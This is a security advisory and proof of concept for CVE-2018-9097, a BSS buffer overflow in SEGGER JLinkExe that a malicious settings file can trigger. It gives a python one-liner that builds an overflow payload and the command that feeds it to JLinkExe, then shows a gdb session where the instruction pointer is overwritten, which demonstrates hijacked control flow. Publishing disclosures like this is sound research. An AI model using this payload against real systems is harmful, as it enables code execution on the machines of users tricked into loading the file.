### JLinkExe SettingsFile BSS Overflow ###

# Product #
JLink v3.60b

# Vulnerability Type #
Buffer Overflow

# CVE Reference #
CVE-2018-9097

# Security Issue #
The libjlinkarm.so.6.30.2 library used in the JLinkExe binary contains a buffer overflow in the BSS segment. This overflow can be exploited to overwrite function pointers in the BSS segment, which are later called leading to arbitrary code execution. If an attacker can trick a user into loading a crafted settings file, it can lead to local arbitrary code execution as that user.

# Exploit/POC #
The following was performed on 32-bit Ubuntu 16.04 with a JLink EDU Mini

1. Plug in a JLink compatible device into the target computer
2. In a new terminal, change the systemâ€™s ulimit to enable core dumps:
# ulimit -c unlimited

3. The following commands will create a malicious settings file that will cause JLinkExe to segfault, when attempting to process. This should create a core file in the working directory:
# python -c "print(('A'*30008)+'\x3f\xb3\xad\xd3')" > payload
# ./JLinkExe -SettingsFile payload
SEGGER J-Link Commander V6.30b (Compiled Feb  2 2018 18:37:38)
DLL version V6.30b, compiled Feb  2 2018 18:37:32

Connecting to J-Link via USB...O.K.
Firmware: J-Link EDU Mini V1 compiled Mar  2 2018 17:10:16
Hardware version: V1.00
S/N: XXXXXXXXX
License(s): GDB, FlashBP
VTref = 0.000V
Segmentation fault (core dumped)

4. Analyze the core file with GDB, and observe that EIP was overwritten with 0xD3ADB33F:

# GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word".
[New LWP 3366]
[New LWP 3370]
[New LWP 3369]
[New LWP 3368]
[New LWP 3367]
[New LWP 3371]
Core was generated by `./JLinkExe -SettingsFile payload'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xb6358c35 in ?? ()
[Current thread is 1 (LWP 3366)]
gdb-peda$ bt
#0  0xb6358c35 in ?? ()
#1  0xbf8bb08d in ?? ()
#2  0xb633d982 in ?? ()
#3  0xd3adb33f in ?? ()
#4  0x00000200 in ?? ()
#5  0xb6591564 in ?? ()
#6  0xb736c860 in ?? ()
#7  0xb633e1bf in ?? ()
#8  0x00000000 in ?? ()
gdb-peda$ i f 3
Stack frame at 0xbf8bb058:
 eip = 0xd3adb33f; saved eip = 0x200
 called by frame at 0xbf8bb05c, caller of frame at 0xbf8bb054
 Arglist at 0xbf8bb050, args: 
 Locals at 0xbf8bb050, Previous frame's sp is 0xbf8bb058
 Saved registers:
  eip at 0xbf8bb0542

# Network Access #
None

# Severity #
Medium

